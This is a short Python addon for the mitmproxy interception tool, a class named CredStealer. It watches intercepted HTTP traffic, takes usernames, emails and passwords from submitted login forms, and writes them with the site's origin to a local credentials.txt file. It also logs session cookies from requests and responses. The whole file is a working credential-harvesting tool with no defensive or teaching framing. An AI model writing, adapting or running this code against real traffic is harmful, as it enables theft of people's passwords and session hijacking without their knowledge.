from mitmproxy import http
from datetime import datetime


class CredStealer:
    creds_dict = []
    cred_text = open("credentials.txt", "a")

    def load(self, loader):
        now = datetime.now()
        self.cred_text.write(f"\nStealing Credentials Time: {now}\n")
        self.cred_text.close()

    def request(self, flow: http.HTTPFlow):
        self.cred_text = open("credentials.txt", "a")

    def response(self, flow: http.HTTPFlow):
        self.cred_text = open("credentials.txt", "a")
        if flow.request.method == "POST" and flow.response != None:
            form_data = flow.request.urlencoded_form
            origin = flow.request.headers["origin"]
            user = None
            pswd = None
            for key, value in form_data.items():
                if "pass" in key:
                    pswd = value
                elif ("email" in key) or ("user" in key):
                    user = value
            if user != None and pswd != None and (user, pswd) not in self.creds_dict:
                self.cred_text.write(f"Domain: {origin}\n")
                self.cred_text.write(f"User: {user}\nPassword: {pswd}\n")
                self.creds_dict.append((user, pswd))

        request_cookies = flow.request.cookies.items()
        response_cookies = flow.response.cookies.items()
        for key, value in request_cookies:
            if (key, value) not in self.creds_dict and ("sess" in key):
                self.cred_text.write(f"Possible session: {value}\n")
                self.creds_dict.append((user, pswd))
        for key, value in response_cookies:
            if (key, value) not in self.creds_dict and ("sess" in key):
                self.cred_text.write(f"Possible session: {value}\n")
                self.creds_dict.append((user, pswd))


addons = [
    CredStealer()
]